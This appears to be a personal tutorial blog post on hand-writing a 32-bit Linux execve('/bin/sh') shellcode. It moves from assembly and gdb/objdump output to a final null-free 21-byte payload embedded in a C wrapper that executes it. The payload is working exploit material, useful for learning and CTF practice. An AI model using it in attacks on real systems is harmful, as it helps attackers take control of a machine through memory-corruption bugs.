+++
title = "Shellcode for/by a Newbie"
date = 2017-09-02
tags = ["technology", "ctf"]
[image]
link = "/images/posts/shellcode_newbies/presentation.jpg"
copyright = "https://unsplash.com/photos/8LkImhM6qeA"
+++

I wrote this blog post with a simple goal in mind: I never took the time to understand fully how a shellcode worked. I know about it, I know that it works, but I don't know *how*. So I made myself write this in order to finally grasp its logic. Ready? Let's dig in!

For this article I'm using a Ubuntu Trusty 32bits (with [Vagrant](https://www.vagrantup.com/)).

# The wrapper

In order to execute a shellcode, we're going to use a simple wrapper, written in `C`. Later in the blog post, I'll assume that only `shellcode` changes, so I'll only reference it.

```c
// shellcode.c
const char shellcode[] = "/* shellcode here */";

int main(){
    (*(void(*)()) shellcode)();
    return 0;
}
```

Let's study this line:

```c
(
    *(
        void(*)()
    ) shellcode
)();
```

The `(...)();` wrap the function definition and calls it, we could have done something like:

```c
void function = (...)
function();
```

Next:

```c
void(*)()
```

This is the [function pointer](https://en.wikipedia.org/wiki/Function_pointer) definition, it's saying:

> Define a function without name, without argument and without return value.

And finally:

```c
*(...) shellcode
```

This will tell what are the instructions to execute when the function is called.

Let's do a simple example:

```c
shellcode = "\x90\x90\x90\x90";
```

Just 4 `NOP` operations, let's compile and 

```shell
$ gcc -o shellcode shellcode.c
$ gdb -q ./shellcode
Reading symbols from ./shellcode...(no debugging symbols found)...done.
(gdb) disass main
Dump of assembler code for function main:
   0x080483ed <+0>:     push   %ebp
   0x080483ee <+1>:     mov    %esp,%ebp
   0x080483f0 <+3>:     and    $0xfffffff0,%esp
   0x080483f3 <+6>:     mov    $0x80484a0,%eax
   0x080483f8 <+11>:    call   *%eax
   0x080483fa <+13>:    mov    $0x0,%eax
   0x080483ff <+18>:    leave
   0x08048400 <+19>:    ret
End of assembler dump.
(gdb) x/4i 0x80484a0
   0x80484a0 <shellcode>:       nop
   0x80484a1 <shellcode+1>:     nop
   0x80484a2 <shellcode+2>:     nop
   0x80484a3 <shellcode+3>:     nop
```

The interesting part here is to notice 

```shell
   0x080483f3 <+6>:     mov    $0x80484a0,%eax
   0x080483f8 <+11>:    call   *%eax
```

This is setting the address of our shellcode into `$eax` and calling it. This [`call`](http://x86.renejeschke.de/html/file_module_x86_id_26.html) instruction will jump to the first instruction at the specified address. *This won't work* with the current shellcode, it's just to show the flow of the wrapper.

# Spawning a shell

Our main exercise here will be to spawn a shell, it is a straightforward, yet powerful, way to control a machine. While techniques to have the shellcode in memory are numerous, it's not our focus here, I recommend you read the references links provided. We'll assume that we can execute the shellcode, and we're only interested in its underlying mechanism.

In C, to spawn a shell there are different methods, you can use the [system](http://en.cppreference.com/w/c/program/system) function, e.g.:

```c
system("/bin/sh");
```

Another solution is to use [execve](https://linux.die.net/man/2/execve):

```c
execve("/bin/sh", argv, envp);
```

We will look at `execve`, because it replaces the current process and is simpler than `system` (see differences [here](https://stackoverflow.com/questions/27461936/system-vs-execve) and [here](https://stackoverflow.com/questions/26448841/whats-the-difference-between-system-and-execve)).

# Execve in ASM

To call `execve` we will use the famous `int 0x80` which transfer the flow of the program to the kernel to execute the defined system call. ([c.f.](https://stackoverflow.com/questions/1817577/what-does-int-0x80-mean-in-assembly-code)).

`int 0x80` requires the interrupt number in the `$eax` register, to find the one we want we can run:

```shell
$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep execve
#define __NR_execve 11
```

We can already write the last two instructions of our shellcode:

```asm
...
mov eax, 0xb
int 0x80
```

Now we need to study how `execve` works to setup the correct elements on the stack, [here](https://linux.die.net/man/2/execve) is the function definition:

```c
int execve(const char *filename, char *const argv[], char *const envp[]);
```

The first argument is a string, or as `C` likes to call it "a one-dimensional array of characters terminated by a null character". The second and third arguments are arrays of strings. The first one is the list of arguments the program will receive, for example:

```c
// execve_ls.c
int main(){
    char *filename = "/bin/ls";
    char *argv[3];

    argv[0] = "/bin/ls";
    argv[1] = "/";
    argv[2] = 0;

    execve(filename, argv, 0);
    return 0;
}
```

The first argument of `argv` is by convention started with the name of the current filename being executed.


```shell
$ gcc -o execve_ls execve_ls.c
$ ./execve_ls
bin   dev  home        lib         media  opt   root  sbin  sys  usr      var
...
```

Now we're interested in `/bin/sh` and not `/bin/ls`, but it works just the same. We can actually removes the `argv` and `envp` from our test:


```c
// execve_sh.c
int main(){
    execve("/bin/sh", 0, 0);
    return 0;
}
```

```shell
$ gcc -o execve_sh execve_sh.c
$ ./execve_sh
$ exit # the new shell
$
```

Note that in the following shellcode, we'll explicitly set `argv` (and its corresponding register `ecx`) to `0`, otherwise it'll try to read from the pointed address and can cause troubles.

# Stack and register

Before going any further I need to introduce a concept: the calling convention. Depending on your kernel, how function calling works may change. The two main ways of doing that are:

- Pass every argument on the stack
- Pass some argument on registers (FastCall)


It's important to know what to do, because you may not have the right kernel for the right calling convention. The compiler usually makes that transparent for you, but because we're doing our `ASM` by hand, we need to know which one works.

Simple example, using the registers to call `exit` (syscall `1`) with the return value `1`:

```asm
// exit.asm
section .text
	global _start

_start:
	mov eax, 1
	mov ebx, eax
	int 0x80
```

```bash
$ nasm -f elf exit.asm && ld -o exit exit.o
$ ./exit
$ echo $?
1
```

Now with the stack:

```asm
// exit.asm
section .text
	global _start

_start:
	push 1
	push 1
	int 0x80
```

```bash
$ nasm -f elf exit.asm && ld -o exit exit.o
$ ./exit
Segmentation fault (core dumped)
```

For this example we'll use the Fastcall convention, but it can be adapted easily.

# String's address

This is an interesting part of the shellcode building. We know the string we want to reference, and we need to get its address somehow. We could store the string in the environment variables, or somewhere else in the program's memory, but it would be quite [random to access it](https://en.wikipedia.org/wiki/Address_space_layout_randomization). Instead, we want to store the string inside the shellcode.

Let's see two techniques to do that:

## Call

The `call` instruction ASM is commonly used to jump to another part of the program's flow, but in addition to that, it pushes the next instruction's address into the stack. To place bytes into the shellcode, we can use the `db` commands which [places that bytes in the executable](https://stackoverflow.com/questions/17387492/what-does-the-assembly-instruction-db-actually-do):

```asm
// call_example.asm
section .text
    global _start

_start:
    jmp toCall

main:
    pop eax
    ; eax now contains the string address
    ; ...

toCall:
    call main
    db "/bin/sh"
```

```asm
$ nasm -f elf call_example.asm
$ ld -o call_example call_example.o
$ gdb -q call_example
Reading symbols from call_example...(no debugging symbols found)...done.
(gdb) disass toCall
Dump of assembler code for function toCall:
   0x08048063 <+0>:     call   0x8048062 <main>
   0x08048068 <+5>:     das
   0x08048069 <+6>:     bound  %ebp,0x6e(%ecx)
   0x0804806c <+9>:     das
   0x0804806d <+10>:    jae    0x80480d7
End of assembler dump.
(gdb) x/s 0x08048068
0x8048068 <toCall+5>:   "/bin/sh"<error: Cannot access memory at address 0x804806f>
(gdb) disass main
Dump of assembler code for function main:
   0x08048062 <+0>:     pop    %eax
End of assembler dump.
(gdb) b *0x08048062
Breakpoint 1 at 0x8048062
(gdb) r
Starting program: /home/n4/learning/call_example
Breakpoint 1, 0x08048062 in main ()
(gdb) x/wx $esp
0xbffff74c:     0x08048068
(gdb) ni
0x08048063 in toCall ()
(gdb) x $eax
0x8048068 <toCall+5>:   0x6e69622f
(gdb) x/s $eax
0x8048068 <toCall+5>:   "/bin/sh"
```

Here you can see we can access the string from `eax`, and the strange instructions in `toCall` are just `gdb` interpreting the string as instructions:
```shell
   0x08048068 <+5>:     das
   0x08048069 <+6>:     bound  %ebp,0x6e(%ecx)
   0x0804806c <+9>:     das
   0x0804806d <+10>:    jae    0x80480d7
```

# Push & Save ESP

Another technique is to push the string to the stack and get back the value of `$esp` after this operation. As you saw previously:

```shell
(gdb) x $eax
0x8048068 <toCall+5>:   0x6e69622f
(gdb) x/s $eax
0x8048068 <toCall+5>:   "/bin/sh"
```

In memory we don't store the string, but rather the numeric representation of the string. The computer doesn't care how we add the data in memory, so we could just `push` data directly to the stack:


```shell
0x8048068 <toCall+5>:   "/bin/sh"
(gdb) x/2xw $eax
0x8048068 <toCall+5>:   0x6e69622f      0x0068732f
```

You can see already that we have a `0x00` byte here, which is never a good idea in an exploit string (because it represents the end of a string, so it could cut the string in half). Instead we can use `//bin/sh` or `/bin//sh` which are both valid:

```shell
(gdb) print /x "/bin//sh"
$2 = {0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x0}
```

So our two values are: `0x6e69622f` and `0x68732f2f`. We need to push the second one before, because the second one to be pushed will be the first to be read (the stack is a LIFO):

```asm
// push_example.asm
section .text
    global _start

_start:
    push 0x68732f2f
    push 0x6e69622f
    mov eax, esp
```

You can see, once we pushed those values in the stack, `$esp` will point to the string, so we can store it somewhere else. Let's look at that under `gdb`:

```shell
$ nasm -f elf push_example.asm
$ ld -o push_example push_example.o
$ gdb -q push_example
Reading symbols from push_example...(no debugging symbols found)...done.
(gdb) disass _start
Dump of assembler code for function _start:
   0x08048060 <+0>:     push   $0x68732f2f
   0x08048065 <+5>:     push   $0x6e69622f
   0x0804806a <+10>:    mov    %esp,%eax
End of assembler dump.
(gdb) b *0x0804806a
Breakpoint 1 at 0x804806a
(gdb) r
Starting program: /home/n4/learning/push_example
Breakpoint 1, 0x0804806a in _start ()
(gdb) x/4wx $esp
0xbffff748:     0x6e69622f      0x68732f2f      0x00000001      0xbffff88b
(gdb) x/s $esp
0xbffff748:     "/bin//sh\001"
(gdb) ni
0x0804806c in ?? ()
(gdb) x $eax
0xbffff748:     "/bin//sh\001"
```

So you can see we successfully got the address of the string in `$eax` again.

*Quick note*: because the following memory byte was not null, it was taken as being part of the string, we'll need to fix that later, by pushing `0` to the stack first.

# Writing the shellcode

We're going to use the second method, which is simpler and shorter to write. When writing a shellcode, because you're trying to overflow memory you aren't supposed to use, it's always a good idea to have the shortest payload possible.

## Pseudo-ASM

Let's go back to our interrupt and move up to what we need to have in the registers:

```asm
push 0
push string
push 0
mov ebx, string_address
mov ecx, 0
mov eax, 0xb
int 0x80
```

We can already replace a few instructions:

```asm
push 0
push 0x68732f2f
push 0x6e69622f
push 0
mov ebx, string_address
mov ecx, 0
mov eax, 0xb
int 0x80
```

Now every time we push something on the stack `$esp` changes, so we need to get its value right after the string:

```asm
// shellcode.asm
section .text
    global _start

_start:
    push 0
    push 0x68732f2f
    push 0x6e69622f
    mov  eax, esp
    push 0
    mov ebx, eax
    mov ecx, 0
    mov eax, 0xb
    int 0x80
```

And we have it! Let's try this now:

```asm
$ nasm -f elf shellcode.asm && ld -o shellcode shellcode.o
$ ./shellcode
$ exit
$
```

# Shellcode cleanup

Nice! Let's have a look at our shellcode with `objdump`:

```shell
shellcode:     file format elf32-i386

Contents of section .text:
 8048060 6a00682f 2f736868 2f62696e 89e06a00  j.h//shh/bin..j.
 8048070 89c3b900 000000b8 0b000000 cd80      ..............
```

That's quite nice, but there are a few `00` here, let's have a closer look:

```shell
$ objdump -d shellcode

shellcode:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:       6a 00                   push   $0x0
 8048062:       68 2f 2f 73 68          push   $0x68732f2f
 8048067:       68 2f 62 69 6e          push   $0x6e69622f
 804806c:       89 e0                   mov    %esp,%eax
 804806e:       6a 00                   push   $0x0
 8048070:       89 c3                   mov    %eax,%ebx
 8048072:       b9 00 00 00 00          mov    $0x0,%ecx
 8048077:       b8 0b 00 00 00          mov    $0xb,%eax
 804807c:       cd 80                   int    $0x80
```

So we have twice a problem with `push 0x0`, and once with `mov 0xb, eax`.

## Push

We can't have any `0` displayed in the `asm` code, but we have a few cards in our hand. Using a register, and making sure it's empty, we can then push its value onto the stack. One of the simplest way is to use the `xor` command like so:

```asm
xor eax, eax
```

This will xor `eax` with itself and thus put `0` into this register, we can now push it to the stack:

```asm
xor eax, eax
push eax
```

We need to the other one but we have a problem: we're changing `eax` value, so we can't push it again.

If you look closely you can see that we can optimize our shellcode while solving this problem:

```asm
mov  eax, esp
push 0
mov ebx, eax
```

Is changed to:

```asm
mov  ebx, esp
push eax
```

We never really needed to move `esp` to `eax` if it was to move it to `ebx` later. Shorter code!

## Mov

Firstly, we want to set `ecx` to `0`, the easiest way is to `xor` it, as we saw previously.

Now we want to set `eax` to `11`, but the `mov` command will actually modify the full 4 bytes of the register, and needs to specify the 4 bytes (see the 3 `00` and the unique `0b`).

We could `inc eax` 11 times, but that would be really long!

Instead we can use the `al` register, which is the last 8 bits of the `eax` register:

```shell
64   32   16   8   0
            [AH][AL]
        [EAX       ]
[RAX               ]
```

So with all that, we can just replace

```asm
mov eax, 11
```

with

```asm
mov al, 11
```

And here's the final payload

```asm
section .text
    global _start

_start:
    xor  eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov  ebx, esp
    xor  ecx, ecx
    mov  al, 0xb
    int  0x80
```

It's a little bit shorter than the previous one, but the real occurs when you look at the generated shellcode:

```shell
$ objdump -s shellcode

shellcode:     file format elf32-i386

Contents of section .text:
 8048060 31c05068 2f2f7368 682f6269 6e89e331  1.Ph//shh/bin..1
 8048070 c9b00bcd 80                          .....
```

# Wrapping up

We have our hex instructions, let's put that in our wrapper. Here's a swift way to convert your hex string to the proper format with vim:

```vim
31c050682f2f7368682f62696e89e331c9b00bcd80

:s/\(..\)/\\x\1/g

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80
```

```c
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80";
```

```shell
$ gcc -o shellcode shellcode.c
$ ./shellcode
$ # new shell
```

References:

- [Smashing The Stack For Fun And Profit by Aleph One](http://phrack.org/issues/49/14.html#article)
- [Hacking: The Art of Exploitation by Jon Erickson](https://www.goodreads.com/book/show/61619.Hacking)
- [The Shellcoder's Handbook by Jack Koziol et al.](http://eu.wiley.com/WileyCDA/WileyTitle/productCd-0764544683.html) 
- [execve /bin/sh shellcode 23 bytes by Hamza Megahed](http://shell-storm.org/shellcode/files/shellcode-827.php)
- [X86 Assembly Interfacing with Linux](https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux)
- [What are the calling conventions for UNIX & Linux system calls on x86-64](https://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-on-x86-64)
- [ASM working as is, but not in a C program](https://reverseengineering.stackexchange.com/questions/16244/asm-working-as-is-but-not-in-a-c-program)
